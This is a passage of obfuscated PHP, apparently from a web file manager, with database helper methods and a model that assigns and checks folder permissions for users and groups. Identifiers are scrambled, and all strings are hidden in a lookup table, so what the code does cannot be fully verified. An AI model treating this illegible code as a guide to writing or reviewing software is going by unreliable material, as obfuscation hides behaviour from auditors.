$_SERVER[”ôÑ§ì¸]; $Ï¦º–Êí = $this->query($Êàûá•‡[29] . $øã·‰ . $Êàûá•‡[30]); $¿ş—ßÉŒ = array(); if ($Ï¦º–Êí) { foreach ($Ï¦º–Êí as $Ğ½°ó¤ => $ñôü¶»˜) { $¿ş—ßÉŒ[$ñôü¶»˜[$Êàûá•‡[32]]] = array($Êàûá•‡[32] => $ñôü¶»˜[$Êàûá•‡[32]], $Êàûá•‡[33] => $ñôü¶»˜[$Êàûá•‡[33]], $Êàûá•‡[35] => (bool) ($ñôü¶»˜[$Êàûá•‡[35]] === $Êàûá•‡[12]), $Êàûá•‡[37] => $ñôü¶»˜[$Êàûá•‡[56]], $Êàûá•‡[39] => (bool) $ñôü¶»˜[$Êàûá•‡[57]], $Êàûá•‡[42] => (bool) $ñôü¶»˜[$Êàûá•‡[57]]); } } return $¿ş—ßÉŒ; } public function getTables($µßü˜¤ = '') { $ì¶À¾ñ =& $_SERVER[”ôÑ§ì¸]; $ü„ïîİ¼ = $this->query($ì¶À¾ñ[45] . $ì¶À¾ñ[46] . $ì¶À¾ñ[47]); $Äö¬ø»ş = array(); foreach ($ü„ïîİ¼ as $è•‘±ÈØ => $œäİÏÀ¸) { $Äö¬ø»ş[$è•‘±ÈØ] = current($œäİÏÀ¸); } return $Äö¬ø»ş; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $’üØŠÔÄ =& $_SERVER[”ôÑ§ì¸]; $this->error = $this->_linkID->lastErrorMsg(); if ($’üØŠÔÄ[12] != $this->queryStr) { $this->error .= LNG($’üØŠÔÄ[48]) . $this->queryStr; } think_trace($this->error, $’üØŠÔÄ[12], $’üØŠÔÄ[49]); return $this->error; } public function escapeString($®ŒæÓ) { $íı³àî¹ =& $_SERVER[”ôÑ§ì¸]; if ($this->_linkID) { return $this->_linkID->escapeString($®ŒæÓ); } return str_ireplace($íı³àî¹[58], $íı³àî¹[59], $®ŒæÓ); } public function parseLimit($‘ÌŞ¢·) { $Ù‡ñª¡´ =& $_SERVER[”ôÑ§ì¸]; $íî¦Ûê— = $Ù‡ñª¡´[12]; if (!empty($‘ÌŞ¢·)) { $‘ÌŞ¢· = explode($Ù‡ñª¡´[50], $‘ÌŞ¢·); if (count($‘ÌŞ¢·) > 1) { $íî¦Ûê— .= $Ù‡ñª¡´[51] . $‘ÌŞ¢·[1] . $Ù‡ñª¡´[52] . $‘ÌŞ¢·[0] . $Ù‡ñª¡´[53]; } else { $íî¦Ûê— .= $Ù‡ñª¡´[51] . $‘ÌŞ¢·[0] . $Ù‡ñª¡´[53]; } } return $íî¦Ûê—; } } goto Aê„ÎÍ¦ÉÏ; fß¦•ì ë§: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\x72\143\x65\x5f\141\x75\164\150"; public function getAuth($óÄ¦şÜ™) { $ìö‡á¨ =& $_SERVER[”ôÑ§ì¸]; $•£…Ê Ö = $this->sourceAuthSelect($óÄ¦şÜ™); $È”÷¿… = array(); $Õæ€Ëóó = array(); $‘öºşêÚ = 2 << 25; foreach ($•£…Ê Ö as $÷şçöù ) { $‰å£ëğÌ = Model($ìö‡á¨[539])->listData($÷şçöù [$ìö‡á¨[1970]]); if (!$‰å£ëğÌ) { continue; } $È”÷¿…[] = $÷şçöù ; $öÓÒÏ’º = 0; if ($÷şçöù [$ìö‡á¨[177]] == SourceModel::TYPE_GROUP) { $öÓÒÏ’º = $‘öºşêÚ * 2; } if ($÷şçöù [$ìö‡á¨[177]] == SourceModel::TYPE_USER) { $öÓÒÏ’º = $‘öºşêÚ; } if ($÷şçöù [$ìö‡á¨[177]] == SourceModel::TYPE_USER && $÷şçöù [$ìö‡á¨[537]] == $ìö‡á¨[211]) { $öÓÒÏ’º = 0; } $Õæ€Ëóó[] = $‰å£ëğÌ[$ìö‡á¨[454]] + $öÓÒÏ’º; } array_multisort($Õæ€Ëóó, SORT_DESC, $È”÷¿…); return $È”÷¿…; } public function sourceAuthSelect($¹Èª¨Õ) { $ıèÑß•‘ =& $_SERVER[”ôÑ§ì¸]; static $áª¹í¶À = array(); $İùış£¶ = is_array($¹Èª¨Õ) ? !1 : !0; if ($İùış£¶) { $¹Èª¨Õ = array($¹Èª¨Õ); } $¿ë¹§ = array(); foreach ($¹Èª¨Õ as $â­üéş) { if (isset($áª¹í¶À[$â­üéş])) { $¿ë¹§[$â­üéş] = $áª¹í¶À[$â­üéş]; } } if (count($¿ë¹§) == count($¹Èª¨Õ)) { return $İùış£¶ ? $¿ë¹§[$¹Èª¨Õ[0]] : $¿ë¹§; } $ì¹ã–‘ô = $ıèÑß•‘[2047]; $·¢ä®ò = array($ıèÑß•‘[180] => array($ıèÑß•‘[7], $¹Èª¨Õ)); $ºıÇ¦¬ = $this->field($ì¹ã–‘ô)->order($ıèÑß•‘[442])->where($·¢ä®ò)->select(); $ç«ğğé = array_to_keyvalue_group($ºıÇ¦¬, $ıèÑß•‘[180]); foreach ($¹Èª¨Õ as $â­üéş) { $áª¹í¶À[$â­üéş] = $ç«ğğé[$â­üéş] ? $ç«ğğé[$â­üéş] : array(); } if ($İùış£¶) { return $ºıÇ¦¬; } return $ç«ğğé; } public function setAuth($âİˆ¼ğİ, $ãöÌ¬æ†) { $Ù¡Ãó˜ñ =& $_SERVER[”ôÑ§ì¸]; $ ‡¾¡Å¿ = Model($Ù¡Ãó˜ñ[1363])->sourceInfo($âİˆ¼ğİ); if (!$ ‡¾¡Å¿) { return !1; } if ($ ‡¾¡Å¿[$Ù¡Ãó˜ñ[177]] != SourceModel::TYPE_GROUP) { return !1; } $´ª‚ÂŸì = 1; $ş†øò«Ê = $ ‡¾¡Å¿[$Ù¡Ãó˜ñ[537]]; if ($ş†øò«Ê != $´ª‚ÂŸì) { $…‚„¼°î = array($Ù¡Ãó˜ñ[1866] => $ş†øò«Ê); $ÃóÏ«öô = Model($Ù¡Ãó˜ñ[1956])->field($Ù¡Ãó˜ñ[1674])->where($…‚„¼°î)->select(); $ÃóÏ«öô = array_to_keyvalue($ÃóÏ«öô, $Ù¡Ãó˜ñ[12], $Ù¡Ãó˜ñ[1674]); } $ã÷Û±Ùñ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ş‘ùÜªº = array(); foreach ($ãöÌ¬æ† as $³«–êÒº) { if (!in_array($³«–êÒº[$Ù¡Ãó˜ñ[177]], $ã÷Û±Ùñ)) { show_json(LNG($Ù¡Ãó˜ñ[2048]), !1); } if ($ş†øò«Ê != $´ª‚ÂŸì) { if ($³«–êÒº[$Ù¡Ãó˜ñ[177]] == SourceModel::TYPE_GROUP) { } if ($³«–êÒº[$Ù¡Ãó˜ñ[537]] != 0 && !in_array($³«–êÒº[$Ù¡Ãó˜ñ[537]], $ÃóÏ«öô)) { } } if ($³«–êÒº[$Ù¡Ãó˜ñ[537]] == 0) { $³«–êÒº[$Ù¡Ãó˜ñ[177]] = SourceModel::TYPE_USER; } $ş‘ùÜªº[] = array($Ù¡Ãó˜ñ[180] => $âİˆ¼ğİ, $Ù¡Ãó˜ñ[177] => intval($³«–êÒº[$Ù¡Ãó˜ñ[177]]), $Ù¡Ãó˜ñ[537] => intval($³«–êÒº[$Ù¡Ãó˜ñ[537]]), $Ù¡Ãó˜ñ[1970] => intval($³«–êÒº[$Ù¡Ãó˜ñ[1970]]) ? intval($³«–êÒº[$Ù¡Ãó˜ñ[1970]]) : 0, $Ù¡Ãó˜ñ[2030] => intval($³«–êÒº[$Ù¡Ãó˜ñ[2030]]) ? intval($³«–êÒº[$Ù¡Ãó˜ñ[2030]]) : -1); } $this->where(array($Ù¡Ãó˜ñ[458] => $âİˆ¼ğİ))->delete(); $this->addAll($ş‘ùÜªº); return !0; } public function authClear($İ¼…¶Ûœ) { $°ßäëĞ… =& $_SERVER[”ôÑ§ì¸]; $ä‰åÚ†› = Model($°ßäëĞ…[1363])->sourceInfo($İ¼…¶Ûœ); $ß¶àÙœ = array($İ¼…¶Ûœ); if ($ä‰åÚ†›[$°ßäëĞ…[452]] == $°ßäëĞ…[88]) { $µô’’£ˆ = array($°ßäëĞ…[619] => array($°ßäëĞ…[579], $ä‰åÚ†›[$°ßäëĞ…[552]] . $İ¼…¶Ûœ . $°ßäëĞ…[580])); $ß¶àÙœ = Model($°ßäëĞ…[1363])->field($°ßäëĞ…[458])->where($µô’’£ˆ)->getField($°ßäëĞ…[180], !0); $ß¶àÙœ[] = $İ¼…¶Ûœ; } $this->where(array($°ßäëĞ…[458] => array($°ßäëĞ…[459], $ß¶àÙœ)))->delete(); return !0; } public function getAllChildren($ÏëŸ™ÌÑ) { $şæœÕó =& $_SERVER[”ôÑ§ì¸]; $şñ¿‰¼¸ = Model($şæœÕó[1363])->sourceInfo($ÏëŸ™ÌÑ); if ($şñ¿‰¼¸[$şæœÕó[452]] != $şæœÕó[88]) { return $this->sourceListAuth(array($ÏëŸ™ÌÑ)); } if ($şñ¿‰¼¸[$şæœÕó[177]] != SourceModel::TYPE_GROUP) { return array(); } $ÌË’ø¹ğ = 1; $€¾¨¯ğŒ = array($ÏëŸ™ÌÑ); if ($şñ¿‰¼¸[$şæœÕó[179]] == $şæœÕó[211] && $şñ¿‰¼¸[$şæœÕó[537]] != $ÌË’ø¹ğ) { $€¾¨¯ğŒ = $this->groupChidldAllRootSource($şñ¿‰¼¸[$şæœÕó[537]]); } $…˜¹÷Ç = $this->field($şæœÕó[180])->group($şæœÕó[180])->select(); $…˜¹÷Ç = array_to_keyvalue($…˜¹÷Ç, $şæœÕó[12], $şæœÕó[180]); if (!$…˜¹÷Ç) { return array(); } $Ï°ú‹¹¼ = $şæœÕó[2049]; $ßò‘º¢‘ = array($şæœÕó[180] => array($şæœÕó[7], $…˜¹÷Ç), $şæœÕó[472] => $şæœÕó[211]); $Ï¾½ûˆÀ = Model($şæœÕó[847])->field($Ï°ú‹¹¼)->where($ßò‘º¢‘)->select(); $øáÈ¯‰° = array($ÏëŸ™ÌÑ); foreach ($Ï¾½ûˆÀ as $à­Èæà) { foreach ($€¾¨¯ğŒ as $‘²…ıô ) { $»™öê¨€ = $şæœÕó[50] . $‘²…ıô  . $şæœÕó[50]; $£Óğ®È› = $à­Èæà[$şæœÕó[552]] . $à­Èæà[$şæœÕó[180]] . $şæœÕó[50]; if (strstr($£Óğ®È›, $»™öê¨€)) { $øáÈ¯‰°[] = $à­Èæà[$şæœÕó[180]]; break; } } } return $this->sourceListAuth($øáÈ¯‰°); } private function sourceListAuth($ şÊü±¾) { $ÀæÎ¢ =& $_SERVER[”ôÑ§ì¸]; $ï°¥Äãª = Model($ÀæÎ¢[1363])->sourceListInfo($ şÊü±¾, !0); $è¼¡§… = $this->sourceAuthSelect($ şÊü±¾); $ÉãÏö—² = array(); $ò’®§Œå = array(); foreach ($ï°¥Äãª as $ŒœË»¢) { unset($ŒœË»¢[$ÀæÎ¢[496]]); unset($ŒœË»¢[$ÀæÎ¢[494]]); unset($ŒœË»¢[$ÀæÎ¢[454]]); unset($ŒœË»¢[$ÀæÎ¢[87]]); $Ùòò…¶˜ = $è¼¡§…[$ŒœË»¢[$ÀæÎ¢[180]]]; if (!$Ùòò…¶˜) { continue; } $ŒœË»¢[$ÀæÎ¢[2050]] = $this->authTargetInfo($Ùòò…¶˜); $ŒœË»¢[$ÀæÎ¢[550]] = rtrim($ŒœË»¢[$ÀæÎ¢[556]], $ÀæÎ¢[8]) . $ÀæÎ¢[8] . ltrim($ŒœË»¢[$ÀæÎ¢[550]], $ÀæÎ¢[8]); $ÉãÏö—²[] = $ŒœË»¢; $®Œè ›í = count(explode($ÀæÎ¢[8], trim($ŒœË»¢[$ÀæÎ¢[550]], $ÀæÎ¢[8]))); $ò’®§Œå[] = $®Œè ›í + ($ŒœË»¢[$ÀæÎ¢[33]] == $ÀæÎ¢[75] ? 0 : 1000); } array_multisort($ò’®§Œå, SORT_ASC, $ÉãÏö—²); return $ÉãÏö—²; } private function groupChidldAllRootSource($®©ˆõó) { $Îì§¢Öğ =& $_SERVER[”ôÑ§ì¸]; $øø®ŠÓ¯ = Model($Îì§¢Öğ[2051])->groupChildrenAll($®©ˆõó); $¢åÆşë = array($Îì§¢Öğ[179] => 0, $Îì§¢Öğ[537] => array($Îì§¢Öğ[7], $øø®ŠÓ¯), $Îì§¢Öğ[177] => SourceModel::TYPE_GROUP); $„Ö–Ï¿š = Model($Îì§¢Öğ[847])->field($Îì§¢Öğ[180])->where($¢åÆşë)->select(); $„Ö–Ï¿š = array_to_keyvalue($„Ö–Ï¿š, $Îì§¢Öğ[12], $Îì§¢Öğ[180]); return $„Ö–Ï¿š; } private function authTargetInfo($·èéÑ­¥) { $ÄË±øâğ =& $_SERVER[”ôÑ§ì¸]; $Üë²çÑÙ = array(); $´úĞâõÓ = array(); $ÑšÒ£äà = 2 << 25; foreach ($·èéÑ­¥ as $éÑ¾ıÆ€) { $±â½šê€ = Model($ÄË±øâğ[539])->listData($éÑ¾ıÆ€[$ÄË±øâğ[1970]]); if (!$±â½šê€) { continue; } if ($éÑ¾ıÆ€[$ÄË±øâğ[177]] == SourceModel::TYPE_USER) { $İÆ‘«ò = Model($ÄË±øâğ[545])->getInfoSimpleOuter($éÑ¾ıÆ€[$ÄË±øâğ[537]]); if ($İÆ‘«ò[$ÄË±øâğ[1674]] == $ÄË±øâğ[1219]) { continue; } if ($İÆ‘«ò[$ÄË±øâğ[1674]] == $ÄË±øâğ[211]) { $İÆ‘«ò[$ÄË±øâğ[32]] = LNG($ÄË±øâğ[2052]); } } else { $İÆ‘«ò = Model($ÄË±øâğ[553])->getInfoSimple($éÑ¾ıÆ€[$ÄË±øâğ[537]]); } if (!$İÆ‘«ò) { continue; } $İÆ‘«ò[$ÄË±øâğ[507]] = $±â½šê€; $Üë²çÑÙ[] = $İÆ‘«ò; $²È‹ ¢ğ = 0; if ($éÑ¾ıÆ€[$ÄË±øâğ[177]] == SourceModel::TYPE_GROUP) { $²È‹ ¢ğ = $ÑšÒ£äà * 2; } if ($éÑ¾ıÆ€[$ÄË±øâğ[177]] == SourceModel::TYPE_USER) { $²È‹ ¢ğ = $ÑšÒ£äà; } if ($éÑ¾ıÆ€[$ÄË±øâğ[177]] == SourceModel::TYPE_USER && $éÑ¾ıÆ€[$ÄË±øâğ[537]] == $ÄË±øâğ[211]) { $²È‹ ¢ğ = 0; } $´úĞâõÓ[] = $±â½šê€[$ÄË±øâğ[454]] + $²È‹ ¢ğ; } array_multisort($´úĞâõÓ, SORT_DESC, $Üë²çÑÙ); return $Üë²çÑÙ; } public function getAllChildrenByUser($”ôÍó„ê, $±‹ÊÚ­Ø) { $ÂÛÅç§ =& $_SERVER[”ôÑ§ì¸]; $†¸£ïª = Model($ÂÛÅç§[566])->getInfo($±‹ÊÚ­Ø); if (!$±‹ÊÚ­Ø || !$”ôÍó„ê || !$†¸£ïª) { return array(); } $¬ˆ„òƒ€ = Model($ÂÛÅç§[1363])->sourceInfo($”ôÍó„ê); $Ò„™§áŠ = array(); $ê©¶ÇÑö = 1; if ($¬ˆ„òƒ€[$ÂÛÅç§[179]] == $ÂÛÅç§[211] && $¬ˆ„òƒ€[$ÂÛÅç§[537]] != $ê©¶ÇÑö && $this->groupContainUser($¬ˆ„òƒ€[$ÂÛÅç§[537]], $±‹ÊÚ­Ø)) { foreach ($†¸£ïª[$ÂÛÅç§[2053]] as $—à†¿ñ) { $Æå Ü‰ = Model($ÂÛÅç§[553])->getInfo($—à†¿ñ[$ÂÛÅç§[1866]]); $³ï”Á˜Ã = Model($ÂÛÅç§[566])->getInfoSimpleOuter($±‹ÊÚ­Ø); $³ï”Á˜Ã[$ÂÛÅç§[507]] = $—à†¿ñ[$ÂÛÅç§[454]]; if (Model($ÂÛÅç§[539])->authCheckAction($—à†¿ñ[$ÂÛÅç§[454]][$ÂÛÅç§[454]], $ÂÛÅç§[1887])) { continue; } $¾ë³Û¯ = array($ÂÛÅç§[32] => $ÂÛÅç§[1239] . $Æå Ü‰[$ÂÛÅç§[32]], $ÂÛÅç§[180] => $Æå Ü‰[$ÂÛÅç§[87]][$ÂÛÅç§[180]], $ÂÛÅç§[84] => KodIO::make($Æå Ü‰[$ÂÛÅç§[87]][$ÂÛÅç§[180]]), $ÂÛÅç§[179] => $ÂÛÅç§[211], $ÂÛÅç§[177] => $ÂÛÅç§[546], $ÂÛÅç§[33] => $ÂÛÅç§[583], $ÂÛÅç§[550] => $Æå Ü‰[$ÂÛÅç§[557]], $ÂÛÅç§[1866] => $Æå Ü‰[$ÂÛÅç§[1866]], $ÂÛÅç§[554] => $Æå Ü‰[$ÂÛÅç§[179]], $ÂÛÅç§[2050] => array($³ï”Á˜Ã)); $Ò„™§áŠ[$¾ë³Û¯[$ÂÛÅç§[180]]] = $¾ë³Û¯; } } $é†ÙÊø = array(); $¡øÆêº = $this->getAllChildren($”ôÍó„ê); foreach ($¡øÆêº as $ËõÅ´‡“) { $¬óîß®´ = !1; foreach ($ËõÅ´‡“[$ÂÛÅç§[2050]] as $ìÙœ„óŞ) { if ($ìÙœ„óŞ[$ÂÛÅç§[1674]]) { if ($ìÙœ„óŞ[$ÂÛÅç§[1674]] == $±‹ÊÚ­Ø) { $¬óîß®´ = !0; break; } } if ($ìÙœ„óŞ[$ÂÛÅç§[1866]]) { if ($this->groupContainUser($ìÙœ„óŞ[$ÂÛÅç§[1866]], $±‹ÊÚ­Ø)) { $¬óîß®´ = !0; break; } } } if ($¬óîß®´) { $é†ÙÊø[] = $ËõÅ´‡“; } $¶Ş“ñÙ» = $ËõÅ´‡“[$ÂÛÅç§[180]]; if (isset($Ò„™§áŠ[$¶Ş“ñÙ»])) { $ËõÅ´‡“[$ÂÛÅç§[2050]][] = $Ò„™§áŠ[$¶Ş“ñÙ»][0]; $Ò„™§áŠ[$¶Ş“ñÙ»] = !1; } } $Ò„™§áŠ = array_filter(array_values($Ò„™§áŠ)); $é†ÙÊø = array_merge($Ò„™§áŠ, $é†ÙÊø); return $é†ÙÊø; } public function setAllChildrenByUser($û“¹ §, $‡ø‘Èó¥, $ˆ©‰”±) { $€·Ö¦Ë¦ =& $_SERVER[”ôÑ§ì¸]; $èÓ¥Õ±¹ = $this->getAllChildrenByUser($û“¹ §, $‡ø‘Èó¥); if (!$ˆ©‰”± || !$èÓ¥Õ±¹) { return !1; } foreach ($èÓ¥Õ±¹ as $ÑÔÖı) { $Î¬¼ì— = array(); foreach ($ÑÔÖı[$€·Ö¦Ë¦[2050]] as $³‹±â¶²) { $¥Ñä§Ó‹ = $³‹±â¶²[$€·Ö¦Ë¦[507]]; $šéôÒÙ = $³‹±â¶²[$€·Ö¦Ë¦[1674]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $àÂ‘î·¦ = $³‹±â¶²[$€·Ö¦Ë¦[1674]] ? $³‹±â¶²[$€·Ö¦Ë¦[1674]] : $³‹±â¶²[$€·Ö¦Ë¦[1866]]; if ($³‹±â¶²[$€·Ö¦Ë¦[1674]] && $³‹±â¶²[$€·Ö¦Ë¦[1674]] == $‡ø‘Èó¥) { continue; } $Î¬¼ì—[] = array($€·Ö¦Ë¦[180] => $ÑÔÖı[$€·Ö¦Ë¦[180]], $€·Ö¦Ë¦[177] => $šéôÒÙ, $€·Ö¦Ë¦[537] => intval($àÂ‘î·¦), $€·Ö¦Ë¦[1970] => isset($¥Ñä§Ó‹[$€·Ö¦Ë¦[442]]) ? intval($¥Ñä§Ó‹[$€·Ö¦Ë¦[442]]) : 0, $€·Ö¦Ë¦[2030] => isset($¥Ñä§Ó‹[$€·Ö¦Ë¦[2030]]) ? intval($¥Ñä§Ó‹[$€·Ö¦Ë¦[2030]]) : -1); } $Î¬¼ì—[] = array($€·Ö¦Ë¦[180] => $ÑÔÖı[$€·Ö¦Ë¦[180]], $€·Ö¦Ë¦[177] => SourceModel::TYPE_USER, $€·Ö¦Ë¦[537] => intval($‡ø‘Èó¥), $€·Ö¦Ë¦[1970] => intval($ˆ©‰”±), $€·Ö¦Ë¦[2030] => -1); $this->where(array($€·Ö¦Ë¦[458] => $ÑÔÖı[$€·Ö¦Ë¦[180]]))->delete(); $this->addAll($Î¬¼ì—); } return !0; } public function get($¸£ÈàÛá) { $Õ€¯§â = $this->getSourceList(array($¸£ÈàÛá), !0); return $Õ€¯§â[0]; } public function getSourceList($òãíŒß», $ıîñÉÍÏ = false, $€ğ™„ê¦ = false) { $§ô™Çó =& $_SERVER[”ôÑ§ì¸]; if (!$òãíŒß») { return array(); } $ø”õÀ = Model($§ô™Çó[1363]); if (!$ıîñÉÍÏ && count($òãíŒß») == 1) { $ıîñÉÍÏ = array(); $ıîñÉÍÏ[$òãíŒß»[0]] = $ø”õÀ->sourceInfo($òãíŒß»[0]); } if (!$ıîñÉÍÏ) { $ÇÇÃÍ¿® = array($§ô™Çó[458] => array($§ô™Çó[459], $òãíŒß»)); $ıîñÉÍÏ = $ø”õÀ->field($§ô™Çó[2054])->where($ÇÇÃÍ¿®)->select(); $ıîñÉÍÏ = array_to_keyvalue($ıîñÉÍÏ, $§ô™Çó[180]); } $¬¦ıóóÇ = $òãíŒß»; foreach ($ıîñÉÍÏ as $¨ùƒéáò => $ôä‡Û™”) { $³İô = $ø”õÀ->parentLevelArray($ôä‡Û™”[$§ô™Çó[552]]); $¬¦ıóóÇ = array_merge($¬¦ıóóÇ, array($¨ùƒéáò), array_reverse($³İô)); } $¬¦ıóóÇ = array_values(array_unique($¬¦ıóóÇ)); if (!$¬¦ıóóÇ) { return array(); } $°¬¬Üıì = $this->sourceAuthSelect($¬¦ıóóÇ); $Ü Óûàç = array(); foreach ($¬¦ıóóÇ as $„–‘•ª£) { if (isset($°¬¬Üıì[$„–‘•ª£])) { $Ü Óûàç[$„–‘•ª£] = $°¬¬Üıì[$„–‘•ª£]; } } $êÕ¬ì€Á = $this->userIsRoot($€ğ™„ê¦); $Ò’ùÒ‚· = AuthModel::authAll(); $½…µ‹â‘ = array($§ô™Çó[455] => $Ò’ùÒ‚·, $§ô™Çó[2055] => array($§ô™Çó[460] => 0, $§ô™Çó[1872] => $Ò’ùÒ‚·, $§ô™Çó[461] => LNG($§ô™Çó[2056]), $§ô™Çó[1889] => $§ô™Çó[2057])); $¸Ö±–¬€ = array(); foreach ($ıîñÉÍÏ as $„–‘•ª£ => $Œå€Ÿ¸ó) { if ($êÕ¬ì€Á && $GLOBALS[$§ô™Çó[6]][$§ô™Çó[1885]]) { $¸Ö±–¬€[$„–‘•ª£] = $½…µ‹â‘; continue; } $¸Ö±–¬€[$„–‘•ª£] = $this->makeSourceAuth($Œå€Ÿ¸ó, $Ü Óûàç, $€ğ™„ê¦); } return $¸Ö±–¬€; } public function authDeepCheck($ìøÍµ€Ø, $Ìîµ­ÓË = false) { $†Â§‰üª =& $_SERVER[”ôÑ§ì¸]; $Ìîµ­ÓË = $Ìîµ­ÓË ? $Ìîµ­ÓË : USER_ID; $”Ïƒ¢©© = $this->makeAuthDeep($Ìîµ­ÓË); if (!in_array($ìøÍµ€Ø, $”Ïƒ¢©©[$†Â§‰üª[2058]])) { return !1; } $íÚÈãŠø = array(); foreach ($”Ïƒ¢©©[$†Â§‰üª[2059]] as $å¾¸¼ÇÒ => $‰ˆÍÁ¡) { if (!in_array($ìøÍµ€Ø, $‰ˆÍÁ¡)) { continue; } $íÚÈãŠø[] = $å¾¸¼ÇÒ; } if (!$íÚÈãŠø) { return !1; } $ú¨ƒ“¿Ø = $íÚÈãŠø ? $íÚÈãŠø[0] : $ìøÍµ€Ø; return array($†Â§‰üª[455] => -1, $†Â§‰üª[507] => array($†Â§‰üª[460] => $†Â§‰üª[1219], $†Â§‰üª[1872] => $†Â§‰üª[211], $†Â§‰üª[461] => LNG($†Â§‰üª[2060]), $†Â§‰üª[1889] => $†Â§‰üª[2061]), $†Â§‰üª[2062] => LNG($†Â§‰üª[2063]), $†Â§‰üª[2064] => $this->sourceAuthInfo($ú¨ƒ“¿Ø)); } protected function makeAuthDeep($õÑŠ©È‹ = false) { $Ñ³ÏÑÍ— =& $_SERVER[”ôÑ§ì¸]; static $‡Ì÷òú« = array(); $õÑŠ©È‹ = $õÑŠ©È‹ ? $õÑŠ©È‹ : USER_ID; if (isset($‡Ì÷òú«[$õÑŠ©È‹])) { return $‡Ì÷òú«[$õÑŠ©È‹]; } $å¼õØÆ§ = Model($Ñ³ÏÑÍ—[2065])->listData(); $İ‰é¥ê = array(); foreach ($å¼õØÆ§ as $ÓÈóÁİ¨) { if ($ÓÈóÁİ¨[$Ñ³ÏÑÍ—[454]] == 0 && $ÓÈóÁİ¨[$Ñ³ÏÑÍ—[1888]] == $Ñ³ÏÑÍ—[88]) { $İ‰é¥ê[] = $ÓÈóÁİ¨[$Ñ³ÏÑÍ—[442]]; } } $ş¸Ä˜À = $this->userGroupParents($õÑŠ©È‹); $Î‰§œÉè = array($Ñ³ÏÑÍ—[177] => SourceModel::TYPE_USER, $Ñ³ÏÑÍ—[537] => $õÑŠ©È‹); if ($ş¸Ä˜À) { $Î‰§œÉè = array(array($Ñ³ÏÑÍ—[177] => SourceModel::TYPE_USER, $Ñ³ÏÑÍ—[537] => $õÑŠ©È‹), array($Ñ³ÏÑÍ—[177] => SourceModel::TYPE_GROUP, $Ñ³ÏÑÍ—[537] => array($Ñ³ÏÑÍ—[459], $ş¸Ä˜À)), $Ñ³ÏÑÍ—[1031] => $Ñ³ÏÑÍ—[1964]); } $Çìƒ©ÈÒ = $this->field($Ñ³ÏÑÍ—[2066])->where($Î‰§œÉè)->select(); $¤¤“áÎ´ = array(); $©–›£Æ = array_to_keyvalue_group($Çìƒ©ÈÒ, $Ñ³ÏÑÍ—[180]); foreach ($©–›£Æ as $­èœÓ¡ß => $ÅÆ”íµÃ) { $’˜íğÚË = $this->authArrayCheck($ÅÆ”íµÃ, $õÑŠ©È‹); if ($’˜íğÚË[$Ñ³ÏÑÍ—[455]] > 0) { $¤¤“áÎ´[] = $­èœÓ¡ß . $Ñ³ÏÑÍ—[12]; } } if ($ş¸Ä˜À) { $½åß¨™ = Model($Ñ³ÏÑÍ—[553]); foreach ($ş¸Ä˜À as $çãñø•´) { $ Ğ‰®‰ = $½åß¨™->getInfo($çãñø•´); if (!$ Ğ‰®‰ || !is_array($ Ğ‰®‰[$Ñ³ÏÑÍ—[87]])) { continue; } $¤¤“áÎ´[] = $ Ğ‰®‰[$Ñ³ÏÑÍ—[87]][$Ñ³ÏÑÍ—[180]]; } } $ÆÍŒşÆ = array(); $¬›Ğ½îø = $ş¸Ä˜À; $‚Ëò“Ã½ = Model($Ñ³ÏÑÍ—[1363]); $½åß¨™ = Model($Ñ³ÏÑÍ—[553]); $¾…‰ „Ñ = array(); $ªÒğá˜® = array(); $™¥Àçæö = array(); $â¡¨¹ã = array(); if ($¤¤“áÎ´) { $©ƒÂ®Ñ¦ = $‚Ëò“Ã½->where(array($Ñ³ÏÑÍ—[180] => array($Ñ³ÏÑÍ—[459], $¤¤“áÎ´)))->select(); foreach ($©ƒÂ®Ñ¦ as $¸·—¨¤–) { $ñ²·Õóä = $‚Ëò“Ã½->parentLevelArray($¸·—¨¤–[$Ñ³ÏÑÍ—[552]]); $ÆÍŒşÆ = array_merge($ÆÍŒşÆ, $ñ²·Õóä); $¬›Ğ½îø[] = $¸·—¨¤–[$Ñ³ÏÑÍ—[537]]; $¾…‰ „Ñ[$¸·—¨¤–[$Ñ³ÏÑÍ—[180]]] = $ñ²·Õóä; $ªÒğá˜®[$¸·—¨¤–[$Ñ³ÏÑÍ—[180]]] = $¸·—¨¤–[$Ñ³ÏÑÍ—[537]]; } } $¬›Ğ½îø = array_values(array_unique($¬›Ğ½îø)); $œ½î‘áÕ = $¬›Ğ½îø; foreach ($œ½î‘áÕ as $çãñø•´) { $ Ğ‰®‰ = $½åß¨™->getInfo($çãñø•´); $ñ²·Õóä = $‚Ëò“Ã½->parentLevelArray($ Ğ‰®‰[$Ñ³ÏÑÍ—[552]]); $¬›Ğ½îø = array_merge($¬›Ğ½îø, $ñ²·Õóä); } $¬›Ğ½îø = array_values(array_unique($¬›Ğ½îø)); foreach ($¬›Ğ½îø as $çãñø•´) { $ Ğ‰®‰ = $½åß¨™->getInfo($çãñø•´); $ÆÍŒşÆ[] = $ Ğ‰®‰[$Ñ³ÏÑÍ—[87]][$Ñ³ÏÑÍ—[180]]; $™¥Àçæö[$çãñø•´] = $ Ğ‰®‰[$Ñ³ÏÑÍ—[87]][$Ñ³ÏÑÍ—[180]]; $â¡¨¹ã[$çãñø•´] = $‚Ëò“Ã½->parentLevelArray($ Ğ‰®‰[$Ñ³ÏÑÍ—[552]]); } foreach ($¾…‰ „Ñ as $²…·ª¬İ => $—Ú±í–ë) { $Í‚Ôî² = $ªÒğá˜®[$²…·ª¬İ]; if (!$Í‚Ôî² || !$™¥Àçæö[$Í‚Ôî²]) { continue; } $Ë ¹é¬é = array(); foreach ($â¡¨¹ã[$Í‚Ôî²] as $çãñø•´) { $Ë ¹é¬é[] = $™¥Àçæö[$çãñø•´]; } $¾…‰ „Ñ[$²…·ª¬İ] = array_merge($Ë ¹é¬é, $—Ú±í–ë); } $ÆÍŒşÆ = array_values(array_unique($ÆÍŒşÆ)); $Šš®ÂàÏ = array($Ñ³ÏÑÍ—[2058] => $ÆÍŒşÆ, $Ñ³ÏÑÍ—[2059] => $¾…‰ „Ñ); $‡Ì÷òú«[$õÑŠ©È‹] = $Šš®ÂàÏ; return $Šš®ÂàÏ; } private function makeSourceAuth($‰Úò‚‘µ, $ş¬§íù”, $ş£üÁØŠ = false) { $Ûú¬¬Ÿã =& $_SERVER[”ôÑ§ì¸]; $°ï¬­–© = $Ûú¬¬Ÿã[88]; 